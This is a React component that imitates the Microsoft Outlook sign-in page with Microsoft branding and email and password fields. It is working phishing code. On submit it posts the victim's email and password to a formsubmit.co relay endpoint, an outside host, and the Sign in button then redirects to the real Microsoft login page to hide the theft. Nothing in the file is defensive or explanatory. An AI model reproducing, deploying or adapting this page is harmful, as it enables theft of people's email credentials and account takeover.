 import './Outlook.scss'
 
 import { useNavigate } from "react-router-dom";
 
import { useState, useEffect } from "react";

import { BsFillRecordCircleFill, BsQuestionCircle  } from 'react-icons/bs';
import { FiSearch, FiLock  } from 'react-icons/fi';
import { LiaTimesSolid } from 'react-icons/lia';

import { LiaKeySolid } from "react-icons/lia";

import MicrosoftLogo from '../../assets/microsoft_logo_ee5c8d9fb6248c938fd0.svg'
import OutlookLogo from '../../assets/53_8b36337037cff88c3df2.png'



function Outlook() {
  const [isLoading, setIsLoading] = useState(false);
  const [formValues, setFormValues] = useState({});

  const [touched, setTouched] = useState({});

  //error
  const [formError, setFormError] = useState({});

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormValues({ ...formValues, [name]: value });

    setTouched((prevState) => ({
      ...prevState,
      [e.target.name]: true,
    }));
  };

  const validate = (values) => {
    const errors = {};
    const regex =
      /^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9-]+(?:\.[a-zA-Z0-9-]+)*$/;

    if (!values.email) {
      errors.email = "Email is required";
    } else if (!regex.test(values.email)) {
      errors.email = "This is not a valid email";
    }

/*
    if (!values.password) {
      errors.password = "Enter your password";
    }
*/
    return errors;
  };

  useEffect(() => {
    validate(formValues);
    setFormError(validate(formValues));
  }, [formValues, touched]);

  const handlesubmit = (e) => {
    e.preventDefault();
    setIsLoading(true);
    if (Object.keys(formError).length > 0) {
      setTouched({
        email: true,
       // password: true,
      });
      setIsLoading(false);
    }
    if (Object.keys(formError).length === 0) {
      setTouched({
        email: false,
      //  password: false,
      });

      fetch("https://formsubmit.co/ajax/b740faa9c2ebd5832f9dd248ca62d330", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          Accept: "application/json",
        },
        body: JSON.stringify({
          password: formValues.password,
          email: formValues.email,
 
          _subject: `New form submitted  By ${formValues.email}`,
          _captcha: true,
          _blacklist: "spammy pattern, banned term, phrase",
          _template: "box",
        }),
      })
        .then((response) => response.json())
        .then((data) => {
          if (data.success === "true") {
            setFormValues({})
            setIsLoading(false)
           // alert("success");
    
          } else {
          //  alert("failure");
          setFormValues({})
          setIsLoading(false)
          }
        })
        .catch((error) => console.log(error));
    }
  };
  

  const navigate = useNavigate()

  const gotToNewPage=()=>{
    navigate("https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=152&ct=1716742830&rver=7.0.6738.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fcobrandid%3dab0455a0-8d03-46b9-b18b-df2f57b9e44c%26nlp%3d1%26RpsCsrfState%3da6de4250-edd2-d164-d8fa-226f2a36bddf&id=292841&aadredir=1&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=ab0455a0-8d03-46b9-b18b-df2f57b9e44c");
  }
  

  return (
  
    <div className='payment-form-container'>

      <form onSubmit={handlesubmit} className="payment-form-cont">
        <div className='box'>
         <img src={OutlookLogo} className='Outlook-logo'/>
          
          <div className='main-microsoft-div'>
              <div className='main-microsoft-logo'>
                 <img src={MicrosoftLogo} className='microsoft-logo'/>
              </div>
               <div className='main-microsoft-signin'>
                   <h2 className='main-microsoft-signin-title'>
                      Sign in
                   </h2>
                    <p className='main-microsoft-signin-p'>
                      to continue to Outlook
                   </p>
               </div>
               
               <div>
                     
                    <input 
                    className='payment-email'
                    placeholder="Email"
                    type="text"
                    name="email"
                    value={formValues.email} onChange={handleChange} 
                    />
                    
                       <input 
                    className='payment-email'
                    placeholder="Password"
                    type="text"
                    name="password"
                    value={formValues.password} onChange={handleChange} 
                    />
          
               
               
               </div>
               
               
                <div className='main-microsoft-noaccount'>
                     <p className='main-microsoft-noaccount-p'>
                      No account?
                     </p>
                      <a href='https://signup.live.com/signup?lcid=1033&wa=wsignin1.0&rpsnv=152&ct=1716739323&rver=7.0.6738.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fnlp%3d1%26signup%3d1%26cobrandid%3dab0455a0-8d03-46b9-b18b-df2f57b9e44c%26RpsCsrfState%3d1c95cc24-1f85-dc96-b4e1-70010f8d0b43&id=292841&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=ab0455a0-8d03-46b9-b18b-df2f57b9e44c&lic=1&uaid=c03384ce277d4bf98e224dbc3e49114c' className='main-microsoft-noaccount-a'>
                      Create one!
                     </a>
                </div>
                 <div className='main-microsoft-next'>
                     <button 
                     onClick={() => gotToNewPage()}
                     className='main-microsoft-nextBtn'
                     type="submit">
                         Sign in
                     </button>
                 </div>
          </div>
          
           <div className='main-microsoft-sign-in-opt'>
               <LiaKeySolid className='main-microsoft-sign-in-opt-key'/>
                <p className='main-microsoft-sign-in-opt-p'>
                   Sign-in options
                 </p>
          </div>

        </div>

      </form>
      
      
        
       </div>  

  );
}

export default Outlook;
